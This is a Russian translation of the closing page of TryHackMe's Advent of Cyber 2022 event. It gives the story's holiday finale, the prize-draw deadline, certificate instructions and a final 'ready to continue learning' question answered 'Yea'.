Однако, поскольку Санта в воздухе, она могла бы вычеркнуть «Спасти Рождество» из списка. Успех!

МакСкиди и вся команда «Эльф» празднуют победу за прекрасным рождественским ужином

McSkidy и все эльфы из команды безопасности Санты благодарят вас за помощь в этом году.
Они обещали позвонить вам, если попадут в беду в 2023 году!

[Последний отсчет]
У вас есть время до конца 27 декабря, чтобы ответить на как можно большее количество вопросов в этой комнате. Каждый 
отвеченный вопрос — это дополнительный билет в розыгрыше главного приза! Мы объявим победителей 28 декабря. Смотрите 
таймер ниже для точного отсчета!  


Комната Advent of Cyber 2022 останется доступной для вашего исследования. Возьмите последний вопрос мероприятия ниже 
и получите еще один лотерейный билет! Обратите внимание, что как только вы ответите на все вопросы в этой комнате, 
вы получите значок и сертификат Advent of Cyber 2022. Очень круто! Проверьте  свое полное имя на странице профиля, 
прежде чем генерировать сертификат, так как его нельзя будет изменить впоследствии.   

Счастливых праздников,

Команда TryHackMe

### Ответить на вопросы ниже
Вы готовы продолжить свое обучение на TryHackMe? (Да, да)
```commandline
Yea
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)